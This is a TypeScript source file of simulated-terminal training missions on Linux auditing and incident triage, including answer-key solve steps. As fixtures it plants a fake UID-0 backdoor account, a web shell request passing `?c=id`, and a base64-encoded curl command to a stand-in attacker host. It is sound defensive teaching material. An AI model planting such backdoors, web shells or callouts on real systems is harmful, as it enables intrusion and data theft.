/** Terminal missions for later months: auditing, log triage, encodings. */
import { machine } from "@/lib/shell/world";
import { authLog } from "./linux";
import { flagFrom, submitted, type Mission, type RangeSet } from "./kit";

const audit: Mission[] = [
  {
    id: "audit-1",
    title: "A second root",
    brief: "Audit check 1: only root should have UID 0. `/etc/passwd` has seven fields split by `:`, and the third is the UID. Find the account with UID 0 that isn't root and submit its name.",
    hints: ["`awk -F: '$3 == 0 {print $1}' /etc/passwd`"],
    build: (rng) => {
      const shell = machine("ana", [{ name: "ana", uid: 1000 }]);
      const name = rng.pick(["sysbackup", "toor", "svc_maint"]);
      const p = shell.fs.lookup("/etc/passwd", "/", shell.creds);
      p.content += `${name}:x:0:0::/root:/bin/bash\n`;
      return { shell, flag: name };
    },
    passed: submitted,
    solve: (w) => ["awk -F: '$3 == 0 {print $1}' /etc/passwd", `submit ${w.flag}`],
    debrief: "The kernel only sees numbers. Any account with UID 0 IS root, whatever it's called. That's a classic backdoor, and your audit script will catch it.",
  },
  {
    id: "audit-2",
    title: "World-writable files",
    brief: "Audit check 2: files anyone can modify are dangerous. Find the world-writable regular file under `/etc` and submit its full path.",
    hints: ["`find /etc -type f -perm -002`"],
    build: (rng) => {
      const shell = machine("ana", [{ name: "ana", uid: 1000 }]);
      const f = `/etc/${rng.pick(["cron.d/backup", "profile.d/env.sh", "ssh/sshd_config"])}`;
      shell.fs.put(f, "# config\n", { mode: 0o666 });
      return { shell, flag: f };
    },
    passed: submitted,
    solve: (w) => ["find /etc -type f -perm -002 2>/dev/null", `submit ${w.flag}`],
    debrief: "If anyone can edit a file that root runs, anyone can become root. These checks become lines in your `audit.sh` for project P01.",
  },
  {
    id: "audit-3",
    title: "SSH settings",
    brief: "Audit check 3: `/etc/ssh/sshd_config` should have `PermitRootLogin no`. Find the active line (not a comment) that sets it, and submit its current value.",
    hints: ["`grep -v '^#' /etc/ssh/sshd_config | grep PermitRootLogin`"],
    build: (rng) => {
      const shell = machine("ana", [{ name: "ana", uid: 1000 }]);
      const v = rng.pick(["yes", "prohibit-password"]);
      shell.fs.put("/etc/ssh/sshd_config", `# Secure defaults\n#PermitRootLogin no\nPort 22\nPermitRootLogin ${v}\nPasswordAuthentication yes\n`);
      return { shell, flag: v };
    },
    passed: submitted,
    solve: (w) => ["grep -v '^#' /etc/ssh/sshd_config | grep PermitRootLogin", `submit ${w.flag}`],
    debrief: "Comment lines don't count, which is why you filter them out first. A checker that greps the raw file gets fooled by `#PermitRootLogin no`.",
  },
];

const triage: Mission[] = [
  {
    id: "triage-1",
    title: "Did the attacker get in?",
    brief: "An alert says brute force from `203.0.113.7`. The real question is whether it worked. Find any `Accepted` login from that IP and submit the username.",
    hints: ["`grep Accepted /var/log/auth.log | grep 203.0.113.7`"],
    build: (rng) => {
      const shell = machine("ana", [{ name: "ana", uid: 1000 }]);
      const user = rng.pick(["deploy", "backup", "svc_web"]);
      shell.fs.put("/var/log/auth.log", `${authLog(rng, "203.0.113.7", 50)}Oct 27 09:41:02 web1 sshd[901]: Accepted password for ${user} from 203.0.113.7 port 44122 ssh2\n`);
      return { shell, flag: user };
    },
    passed: submitted,
    solve: (w) => ["grep Accepted /var/log/auth.log | grep 203.0.113.7", `submit ${w.flag}`],
    debrief: "Many failures followed by one success from the same IP is the difference between noise and an incident. That success turns this alert into a true positive.",
  },
  {
    id: "triage-2",
    title: "What did it download?",
    brief: "Web logs are in `/var/log/nginx/access.log`. An attacker's IP requested a suspicious `.php` file from `/uploads/`. Find the file name and submit it, for example `x.php`.",
    hints: ["`grep uploads /var/log/nginx/access.log`", "Look for requests ending in `.php`, not images."],
    build: (rng) => {
      const shell = machine("ana", [{ name: "ana", uid: 1000 }]);
      const shellName = rng.pick(["cmd.php", "up.php", "wso.php"]);
      const lines = Array.from({ length: 300 }, () => `10.0.0.${rng.int(2, 200)} - - [27/Oct/2026:09:${rng.int(10, 59)}:01 +0000] "GET /uploads/img${rng.int(1, 90)}.png HTTP/1.1" 200 ${rng.int(900, 9000)}`);
      lines[rng.int(10, 290)] = `203.0.113.7 - - [27/Oct/2026:09:44:01 +0000] "GET /uploads/${shellName}?c=id HTTP/1.1" 200 41`;
      shell.fs.put("/var/log/nginx/access.log", `${lines.join("\n")}\n`);
      return { shell, flag: shellName };
    },
    passed: submitted,
    solve: (w) => ["grep php /var/log/nginx/access.log", `submit ${w.flag}`],
    debrief: "`?c=id` is a command passed to a web shell, and the 200 status means it ran. You went from an alert to evidence of code execution with two greps.",
  },
  {
    id: "triage-3",
    title: "Decode the payload",
    brief: "`/tmp/stage.b64` was dropped by the attacker. It's base64: an encoding, not encryption. Decode it and submit the flag inside.",
    hints: ["`base64 -d /tmp/stage.b64`"],
    build: (rng) => {
      const flag = flagFrom(rng);
      const shell = machine("ana", [{ name: "ana", uid: 1000 }]);
      shell.fs.put("/tmp/stage.b64", `${btoa(`curl http://evil.example/${flag}`)}\n`);
      return { shell, flag };
    },
    passed: submitted,
    solve: (w) => ["base64 -d /tmp/stage.b64", `submit ${w.flag}`],
    debrief: "Base64 has no key, so anyone can reverse it. Attackers use it to dodge simple text matching, not to keep secrets.",
  },
];

export const MISSIONS_LATER: Record<string, RangeSet> = {
  audit: { title: "Audit a Linux host, one check at a time", missions: audit },
  triage: { title: "Triage a real-looking alert", missions: triage },
  sandbox: {
    title: "Free terminal",
    missions: [
      {
        id: "free",
        title: "Free play",
        brief: "No task here. Try anything you've learned. Type `help` to see what's available.",
        hints: ["`help` lists the commands. `man ls` explains one."],
        build: () => {
          const shell = machine("ana", [{ name: "ana", uid: 1000 }, { name: "sam", uid: 1001 }]);
          shell.fs.put("/home/ana/notes.txt", "alpha\nbravo\ncharlie\n", { owner: "ana" });
          return { shell };
        },
        passed: () => false,
        solve: () => [],
        debrief: "",
      },
    ],
  },
};
